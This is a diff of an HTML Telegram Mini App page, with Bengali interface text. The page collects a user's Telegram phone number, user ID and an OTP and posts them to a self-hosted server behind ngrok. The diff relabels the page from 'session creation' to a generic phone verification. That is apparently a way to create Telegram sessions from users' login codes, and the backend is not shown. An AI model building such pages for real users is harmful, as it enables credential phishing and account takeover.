@@ -3,133 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>সেশন তৈরি</title>
+    <title>OTP Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            padding: 20px;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            max-width: 400px;
-            width: 100%;
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        h2 { text-align: center; margin-bottom: 20px; }
-        input, button {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0 16px 0;
-            border-radius: 10px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-            background: var(--tg-theme-bg-color, #fff);
-            color: var(--tg-theme-text-color, #000);
-        }
-        button {
-            background: #0088cc;
-            color: white;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; padding: 20px; background: #1e1e1e; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { max-width: 400px; width: 100%; background: #2c2c2c; padding: 20px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        h2 { text-align: center; margin-bottom: 20px; color: #00ccff; }
+        input { width: 100%; padding: 12px; margin: 8px 0 15px 0; border-radius: 8px; border: 1px solid #444; background: #333; color: white; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 16px; margin-bottom: 10px; }
         button:hover { background: #006699; }
+        #result { text-align: center; font-size: 16px; margin-top: 15px; font-weight: bold; }
+        .success { color: #00e676; }
+        .error { color: #ff5252; }
+        #otpSection { display: none; }
         .hidden { display: none; }
-        #result { text-align: center; font-size: 18px; margin-top: 10px; }
-        .success { color: green; }
-        .error { color: red; }
     </style>
 </head>
 <body>
-    <div class="container" id="app">
-        <h2>📱 সেশন তৈরি</h2>
-        <div id="step1">
-            <p>আপনার টেলিগ্রাম ফোন নম্বর দিন:</p>
-            <input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
-            <button onclick="sendOTP()">ওটিপি পাঠান</button>
-        </div>
-        <div id="step2" class="hidden">
-            <p>ওটিপি কোড দিন (কনসোলে দেখুন):</p>
-            <input type="text" id="otp" placeholder="123456" inputmode="numeric">
-            <button onclick="verifyOTP()">যাচাই করুন</button>
-        </div>
-        <div id="result" class="hidden"></div>
+
+<div class="container" id="app">
+    <h2>📱 ফোন ভেরিফাই করুন</h2>
+    
+    <div id="phoneSection">
+        <label>টেলিগ্রাম নম্বর দিন:</label>
+        <input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
+        <button onclick="sendOTP()">OTP পাঠান</button>
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
+    <div id="otpSection">
+        <label>OTP কোড দিন:</label>
+        <input type="text" id="otp" placeholder="1234" maxlength="4" inputmode="numeric">
+        <button onclick="verifyOTP()">যাচাই করুন</button>
+    </div>
 
-        // ⚠️ আপনার সার্ভারের পাবলিক URL দিন (যেমন ngrok দেওয়া লিংক)
-        const API_BASE = "https://your-server-domain.com";  // যেমন "http://localhost:5000" (যদি একই নেটওয়ার্কে হোস্ট করেন)
+    <div id="result"></div>
+</div>
 
-        let tempPhone = '';
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        function showError(msg) { tg.showPopup({ title: '❌', message: msg }); }
-        function showSuccess(msg) { tg.showPopup({ title: '✅', message: msg }); }
+    // 🟢 পার্থক্য এখানে: আপনার Termux এর Ngrok লিংক বসাতে হবে
+    const API_BASE = "http://localhost:5000"; 
 
-        function sendOTP() {
-            const phone = document.getElementById('phone').value.trim();
-            if (!phone || phone.length < 10) {
-                showError('সঠিক ফোন নম্বর দিন');
-                return;
-            }
-            tempPhone = phone;
-            fetch(`${API_BASE}/api/send-otp`, {
+    function showResult(msg, type) {
+        const res = document.getElementById('result');
+        res.innerHTML = msg;
+        res.className = type;
+    }
+
+    async function sendOTP() {
+        const phone = document.getElementById('phone').value;
+        if(!phone) { alert("নম্বর দিন!"); return; }
+        showResult("📤 OTP পাঠানো হচ্ছে...", "");
+        
+        try {
+            const res = await fetch(`${API_BASE}/send-otp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                    showSuccess('ওটিপি পাঠানো হয়েছে (কনসোল চেক করুন)');
-                } else {
-                    showError(data.message || 'সাবমিট ব্যর্থ');
-                }
-            })
-            .catch(() => showError('সার্ভারে যোগাযোগ ব্যর্থ'));
-        }
-
-        function verifyOTP() {
-            const otp = document.getElementById('otp').value.trim();
-            if (!otp || otp.length !== 6) {
-                showError('৬ ডিজিটের ওটিপি দিন');
-                return;
+                body: JSON.stringify({ user_id: userId, phone: phone })
+            });
+            const data = await res.json();
+            if(data.status === 'success') {
+                showResult(data.message, "success");
+                document.getElementById('phoneSection').style.display = 'none';
+                document.getElementById('otpSection').style.display = 'block';
+            } else {
+                showResult(data.message, "error");
             }
-            fetch(`${API_BASE}/api/verify-otp`, {
+        } catch (error) {
+            showResult("❌ সার্ভার যোগাযোগ ব্যর্থ! Ngrok চালু আছে কিনা চেক করুন।", "error");
+        }
+    }
+
+    async function verifyOTP() {
+        const otp = document.getElementById('otp').value;
+        if(!otp || otp.length < 4) { alert("সঠিক ৪ ডিজিটের OTP দিন!"); return; }
+        showResult("🔄 যাচাই করা হচ্ছে...", "");
+        
+        try {
+            const res = await fetch(`${API_BASE}/verify-otp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: tempPhone, otp })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    document.getElementById('step2').classList.add('hidden');
-                    const resultDiv = document.getElementById('result');
-                    resultDiv.innerHTML = `<p class="success">✅ ${data.message}</p>`;
-                    resultDiv.classList.remove('hidden');
-                    showSuccess('সেশন তৈরি হয়েছে!');
-                } else {
-                    showError(data.message || 'যাচাই ব্যর্থ');
-                }
-            })
-            .catch(() => showError('সার্ভারে সমস্যা'));
+                body: JSON.stringify({ user_id: userId, otp: otp })
+            });
+            const data = await res.json();
+            if(data.status === 'success') {
+                showResult(data.message, "success");
+                // সেশন তৈরি হওয়ার পর বাটনটি ডিজেবল করে দেওয়া
+                document.getElementById('otpSection').style.display = 'none';
+            } else {
+                showResult(data.message, "error");
+            }
+        } catch (error) {
+            showResult("❌ যাচাই করতে সমস্যা হচ্ছে।", "error");
         }
-    </script>
+    }
+</script>
 </body>
 </html>
